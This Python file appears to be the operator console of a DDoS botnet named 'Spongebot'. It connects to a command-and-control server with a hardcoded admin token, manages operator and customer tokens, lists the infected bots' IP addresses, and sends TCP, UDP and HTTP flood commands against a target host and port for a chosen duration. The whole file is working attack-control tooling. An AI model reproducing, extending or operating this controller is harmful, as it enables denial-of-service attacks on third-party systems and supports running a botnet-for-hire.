import requests
import time

SERVER_URL = "http://localhost"
SERVER_PORT = 3000
ADMIN_TOKEN = "AD2442e9471b2ff5376b5a70486379f7"

RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
BOLD = "\033[1m"

headers = {"Authorization": ADMIN_TOKEN}

status = {
    'PING': 1 << 0,
    'HELLO': 1 << 1,
    'ATTACK_TCP': 1 << 2,
    'ATTACK_UDP': 1 << 3,
    'ATTACK_HTTP': 1 << 4,
    'EXIT': 1 << 5,
}

status_map = {v: k for k, v in status.items()}

def log(message: str, level="info"):
    colors = {
        "info": BLUE,
        "success": GREEN,
        "warning": YELLOW,
        "error": RED
    }
    print(f"{colors.get(level, RESET)}[{level.upper()}] {message}{RESET}")

def print_banner(): 

    spongebot_ascii = (
        f"\n        .--'''''''''--.        {YELLOW}                                                      {RESET}"
        f"\n     .'      .---.      '.     {YELLOW}    _________                                         {RESET}"
        f"\n    /    .-----------.    \    {YELLOW}   /   _____/______    ____    ____     ____    ____  {RESET}"
        f"\n   /        .-----.        \   {YELLOW}   \_____  \ \____ \  /  _ \  /    \   / ___\ _/ __ \ {RESET}"
        f"\n   |       .-.   .-.       |   {YELLOW}   /        \|  |_> >(  <_> )|   |  \ / /_/  >\  ___/ {RESET}"
        f"\n   |      /   \\ /   \\      | {YELLOW}    /_______  /|   __/  \____/ |___|  / \___  /  \___  >{RESET}"
        f"\n    \\    |{RED} .-.{RESET} |{RED} .-.{RESET} |    /   {YELLOW}          _\/_|__|__           __  \/ /_____/       \/ {RESET}"
        f"\n     '-._| {RED}||| {RESET}| {RED}||| {RESET}|_.-'     {YELLOW}         \______   \  ____  _/  |_                    {RESET}"
        f"\n         | {RED}'-' {RESET}| {RED}'-' {RESET}|         {YELLOW}          |    |  _/ /  _ \ \   __\                   {RESET}"
        f"\n          \\___/ \\___/        {YELLOW}            |    |   \(  <_> ) |  |                     {RESET}"
        f"\n       _.-'  /   \\  `-._      {YELLOW}           |______  / \____/  |__|                     {RESET}"
        f"\n     .' _.--|     |--._ '.     {YELLOW}                                                      {RESET}"
        f"\n     ' _...-|     |-..._ '     {YELLOW}     {GREEN}Spreading Chaos in Bikini Bottom!                {RESET}"
        f"\n            |     |            {YELLOW}        By {BLUE}333revenge                                 {RESET}"
        f"\n            '.___.'            {YELLOW}                                                      {RESET}"
    )

    print(spongebot_ascii)

def print_menu():
    ascii_art = f"""
   ╭────────────┤MENU├────────────╮
   │ {YELLOW}[{BLUE}0{YELLOW}] {CYAN}Tokens{RESET}                   │
   │ {YELLOW}[{BLUE}1{YELLOW}] {CYAN}Attack{RESET}                   │
   │ {YELLOW}[{BLUE}2{YELLOW}] {CYAN}Get info{RESET}                 │
   │ {YELLOW}[{BLUE}3{YELLOW}] {CYAN}Get commands{RESET}             │
   │ {YELLOW}[{BLUE}4{YELLOW}] {CYAN}Get ip addresses{RESET}         │
   │ {YELLOW}[{BLUE}-1{YELLOW}] {RED}Exit{RESET}                    │
   ╰──────────────────────────────╯
    """

    print(ascii_art)

def get_info(key: str = None):
    try:
        req = requests.get(f'{SERVER_URL}:{SERVER_PORT}/info/get', headers=headers)
        if req.status_code == 200:
            data = req.json()
            return data.get(key) if key else data
        log(f"Error: {req.status_code} - {req.text}", "error")
    except requests.RequestException as e:
        log(f"Connection error: {e}", "error")
    return None

def print_info():
    info = get_info()
    if info:
        for key, value in info.items():
            if key not in ('commands', 'ip_addresses'):
                color = CYAN if isinstance(value, list) else GREEN
                print(f"    {BOLD}{YELLOW}{key}:{RESET} {color}{value}{RESET}")
    else:
        log("Failed to retrieve info.", "error")

def print_commands():
    commands = get_info("commands")
    if commands:
        print(f"{BOLD}{BLUE}Commands:{RESET}")
        for cmd in range(len(commands)):
            parsed_cmd = [
                f"{GREEN}Type:{BLUE} {status_map.get(int(line.split(': ')[1]), 'UNKNOWN')}" if line.startswith("Type: ") else line
                for line in commands[cmd].split("\n")
            ]
            print(f"{CYAN}" + f"{'╭' if cmd == 0 else '╰' if cmd == len(commands) - 1 else '│'}" + f"{f' {YELLOW}|{GREEN} '.join(parsed_cmd)}{RESET}")
    else:
        log("No commands available.", "error")

def print_ips():
    ips = get_info("ip_addresses")
    if ips:
        print(f"{BOLD}{BLUE}IP Addresses:{RESET}")
        for ip in ips:
            print(f"{BLUE}-{YELLOW} {ip}{RESET}")
    else:
        log("No addresses available.", "error")

def token_choose(): 
    print("\033[2J")

    print_banner();
    print(f"""
   ╭───────────┤TOKENS├───────────╮
   │ {YELLOW}[{BLUE}0{YELLOW}]{CYAN} Create new token         {RESET}│
   │ {YELLOW}[{BLUE}1{YELLOW}]{CYAN} Revoke token             {RESET}│
   │ {YELLOW}[{BLUE}2{YELLOW}]{CYAN} Validate token           {RESET}│
   │ {YELLOW}[{BLUE}-1{YELLOW}]{CYAN} {RED}Back                    {RESET}│
   ╰──────────────────────────────╯
    """)
    try:
        token_opt = int(input("-> "))
    except ValueError:
        log("Invalid input! Please enter a number.", "error")
        return

    if token_opt == -1:
        return
    
    token = "" if token_opt == 0 else input(f"{YELLOW}[?] Insert token: {RESET}")
    
    roles = ['admin', 'operator', 'supervisor', 'bot', 'customer']
    if token_opt == 0:
        print("\033[2J")
        for i, role in enumerate(roles):
            print(f"[{i}] {role}")
        try:
            role_selected = int(input(f"{YELLOW}[?] Select token role: {RESET}"))
            if role_selected not in range(len(roles)):
                raise ValueError
        except ValueError:
            log("Invalid role selection!", "error")
            return
        req = requests.post(f"{SERVER_URL}:{SERVER_PORT}/token/new/{roles[role_selected]}", headers=headers)
    elif token_opt == 1:
        req = requests.post(f"{SERVER_URL}:{SERVER_PORT}/token/delete/{token}", headers=headers)
    elif token_opt == 2:
        req = requests.post(f"{SERVER_URL}:{SERVER_PORT}/token/{token}", headers=headers)
    else:
        log("Invalid option selected!", "error")
        return

    log(f"{req.text}", "success" if req.status_code == 200 else "error")
    time.sleep(2)

def attack():
    print("\033[2J")
    print_banner()
    print(f"\n   ╭───────────┤ATTACK├───────────╮")
    
    for i, state in enumerate(status.keys()):
        print(f"   │ {YELLOW}[{BLUE}{i}{YELLOW}]{CYAN} {state}{' ' * (25 - len(state))}{RESET}│")
    
    print(f"   │ {YELLOW}[{BLUE}-1{YELLOW}]{CYAN} {RED}Back{RESET}                    │")
    print("   ╰──────────────────────────────╯")
    try:
        attack_opt = int(input(f"   ╭{YELLOW}[{CYAN}?{YELLOW}]{BLUE} Select status: {RESET}"))
        if attack_opt == -1:
            return
        selected_status = list(status.keys())[attack_opt]
    except (ValueError, IndexError):
        log("Invalid input!", "error")
        return
    
    duration, targetIp, targetPort = (1, "0.0.0.0", 1)
    if "ATTACK" in selected_status:
        try:
            duration = int(input(f"   │{YELLOW}[{CYAN}?{YELLOW}]{BLUE} Attack duration (minutes): {RESET}"))
            targetIp = input(f"   │{YELLOW}[{CYAN}?{YELLOW}]{BLUE} Target host (IPv4): {RESET}")
            targetPort = int(input(f"   ╰{YELLOW}[{CYAN}?{YELLOW}]{BLUE} Target port: {RESET}"))
        except ValueError:
            log("Invalid input!", "error")
            return
    
    try:
        req = requests.post(f'{SERVER_URL}:{SERVER_PORT}/command/run/{status[selected_status]}', headers=headers, json={
            'duration': duration,
            'targetIp': targetIp,
            'targetPort': targetPort,
        })
        log(f"Successfully started command: {GREEN}{selected_status}{RESET}", "success" if req.status_code == 200 else "error")
    except requests.RequestException as e:
        log(f"Error contacting server: {e}", "error")

def press_enter():
    input("Please type [ENTER] to continue...")


def main():
    while True:
        print("\033[2J")
        
        print_banner()
        print_menu()

        try:
            opt = int(input("select -> "))
        except ValueError:
            log("Invalid input!", "error")
            continue
        
        if opt == 0:
            token_choose()
        elif opt == 1:
            attack()
            press_enter()
        elif opt == 2:
            print_info()
            press_enter()
        elif opt == 3:
            print_commands()
            press_enter()
        elif opt == 4:
            print_ips()
            press_enter()
        else:
            log("Invalid option!", "error")

if __name__ == "__main__":
    main()
